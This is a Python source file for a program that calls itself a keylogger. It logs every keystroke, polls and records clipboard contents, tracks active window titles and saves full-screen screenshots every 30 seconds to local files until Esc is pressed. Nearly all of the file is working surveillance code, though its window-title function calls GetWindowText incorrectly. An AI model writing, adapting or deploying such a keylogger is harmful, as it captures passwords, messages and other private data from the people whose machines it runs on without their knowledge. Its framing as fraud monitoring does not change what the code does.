import threading
import pynput.keyboard
import pyperclip
import psutil
import time
import logging
from datetime import datetime
import threading
import os
from mss import mss
from PIL import Image

# --- CONFIGURATION ---
LOG_FILE = "fraud_monitor_log.txt"
SCREENSHOT_FOLDER = "Keylogger_Screenshots"
CLIPBOARD_CHECK_INTERVAL = 1  # Check clipboard every 1 second
WINDOW_CHECK_INTERVAL = 1    # Check window title every 1 second
SCREENSHOT_INTERVAL = 30      # Take a screenshot every 30 seconds

# --- SETUP ---
try:
    # Ensure the screenshot directory exists
    os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)
except Exception as e:
    print(f"Error creating screenshot directory: {e}")

# --- LOGGING SETUP ---
logging.basicConfig(filename=LOG_FILE, 
                    level=logging.INFO, 
                    format='[%(asctime)s] %(levelname)s: %(message)s', 
                    datefmt='%Y-%m-%d %H:%M:%S')

# --- GLOBAL STATE TRACKING ---
last_clipboard = ""
last_window_title = ""
# Global to signal threads to stop cleanly
stop_event = threading.Event()

# --- HELPER FUNCTIONS ---

def get_active_window_info():
    """Retrieves the title of the currently active window (Windows specific)."""
    try:
        import ctypes
        # Attempt to get foreground window handle
        if ctypes.windll.user32.GetForegroundWindow():
            hWnd = ctypes.windll.user32.GetForegroundWindow()
            title = ctypes.windll.user32.GetWindowText(hWnd)
            return title
    except ImportError:
        # Fallback if ctypes fails
        return "ctypes_unavailable"
    except Exception as e:
        return f"Error fetching window title: {e}"
    return "Unknown Application"

# --- LAYER 1: KEYBOARD MONITORING ---
def on_press(key):
    """Captures keystrokes."""
    try:
        key_char = key.char
        message = f"KEY_PRESS: '{key_char}'"
        logging.info(message)
        print(f"-> Pressed: {key_char}")
    except AttributeError:
        # Special keys (Shift, Ctrl, Space, etc.)
        key_name = str(key).replace('Key.', '').replace('Key', '')
        message = f"KEY_SPECIAL: {key_name}"
        logging.info(message)
        print(f"-> Special Pressed: {key_name}")

def on_release(key):
    """Handles exit condition."""
    if key == pynput.keyboard.Key.esc:
        print("\n[SYSTEM] Escape key pressed. Signalling shutdown...")
        stop_event.set() # Signal all threads to stop
        return False # Stops the listener

# --- LAYER 1: CLIPBOARD MONITORING ---
def monitor_clipboard():
    """Periodically checks and logs the clipboard content."""
    global last_clipboard
    print("[Monitor] Clipboard monitoring thread started.")
    while not stop_event.is_set():
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard and current_clipboard != last_clipboard:
                # Log only if new content is found
                message = f"CLIPBOARD_UPDATED: '{current_clipboard}'"
                logging.info(message)
                print(f"\n*** CLIPBOARD CAPTURED: {current_clipboard} ***")
                last_clipboard = current_clipboard
            time.sleep(CLIPBOARD_CHECK_INTERVAL)
        except Exception as e:
            logging.error(f"Clipboard error: {e}")
            time.sleep(CLIPBOARD_CHECK_INTERVAL)

# --- LAYER 2: WINDOW TRACKER ---
def window_tracker():
    """Periodically checks and logs the active window context."""
    global last_window_title
    print("[Monitor] Window tracking thread started.")
    while not stop_event.is_set():
        current_title = get_active_window_info()

        if current_title != last_window_title:
            message = f"WINDOW_FOCUS: '{current_title}'"
            logging.info(message)
            print(f"\n--- Focus Shift Detected: {current_title} ---")
            last_window_title = current_title

        time.sleep(WINDOW_CHECK_INTERVAL)

# --- LAYER 2: SCREENSHOT SERVICE ---
def screenshot_service():
    """Periodically captures and saves the screen."""
    print("[Monitor] Screenshot service thread started.")
    with mss() as sct:
        while not stop_event.is_set():
            try:
                # Capture the entire screen
                sct_img = sct.grab(sct.monitors[1]) # Assumes primary monitor is index 1

                # Generate unique filename
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(SCREENSHOT_FOLDER, f"capture_{timestamp}.png")

                # Save image using PIL
                img = Image.frombytes("RGB", sct_img.size, sct_img.rgb, "raw", "RGB")
                img.save(filename)

                # Log the successful capture to the master log
                logging.info(f"SCREENSHOT_TAKEN: Image saved as {os.path.basename(filename)}")
                print(f"\n--- Screenshot captured: {filename} ---")

                # Wait until the next interval, but respect the stop signal
                stop_event.wait(SCREENSHOT_INTERVAL) 

            except Exception as e:
                logging.error(f"Screenshot service error: {e}")
                stop_event.wait(SCREENSHOT_INTERVAL) # Wait on error

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    print("="*60)
    print("📡 DIG KEYLOGGER SYSTEM V2 ONLINE 📡")
    print(f"Log output: {LOG_FILE}")
    print(f"Image output: {SCREENSHOT_FOLDER}/")
    print("Press 'Esc' key to shut down the system.")
    print("="*60)

    # 1. Start the background threads
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()

    window_thread = threading.Thread(target=window_tracker, daemon=True)
    window_thread.start()

    screenshot_thread = threading.Thread(target=screenshot_service, daemon=True)
    screenshot_thread.start()

    # 2. Start the main keyboard listener thread
    listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    # 3. Wait for the listener thread to finish (i.e., until Esc is pressed)
    listener.join()

    # Signal all daemon threads to clean up gracefully
    stop_event.set() 
    # Give threads a moment to finish their last loop iteration
    time.sleep(2) 

    print("\n" + "="*60)
    print("✅ SYSTEM SHUTDOWN COMPLETE. Review logs and images.")
    print("="*60)